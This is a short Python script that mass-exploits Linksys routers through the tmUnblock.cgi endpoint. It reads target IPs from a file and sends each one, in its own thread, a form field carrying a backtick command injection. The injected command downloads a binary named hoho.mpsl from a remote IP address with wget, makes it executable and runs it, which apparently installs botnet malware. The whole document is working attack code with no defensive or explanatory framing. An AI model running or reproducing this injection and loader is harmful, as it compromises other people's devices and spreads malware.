#! python !#
import threading, sys, time, random, socket, subprocess, re, os, base64, struct, array, requests
from threading import Thread
from time import sleep
import requests
from requests.auth import HTTPDigestAuth
from decimal import *	
ips = open(sys.argv[1], "r").readlines()

url_data = {
    "submit_button": "",
    "change_action": "",
    "action": "",
    "commit": "0",
    "ttcp_num": "2",
    "ttcp_size": "2",
    "ttcp_ip": "-h `cd /tmp; rm -rf hoho.mpsl; wget http://87.121.98.42/bins/hoho.mpsl;chmod 777 *;./hoho.mpsl Swizz.mpsl`",
    "StartEPI": "1",
}

class rtek(threading.Thread):
		def __init__ (self, ip):
			threading.Thread.__init__(self)
			self.ip = str(ip).rstrip('\n')
		def run(self):
			try:
				print "[LINKSYS] Loading - " + self.ip
				url = "http://"+self.ip+":8080/tmUnblock.cgi"
				requests.post(url, data=url_data, timeout=3)
				requests.get(url, timeout=3)
			except Exception as e:
				pass
for ip in ips:
	try:
		n = rtek(ip)
		n.start()
		time.sleep(0.03)
	except:
		pass
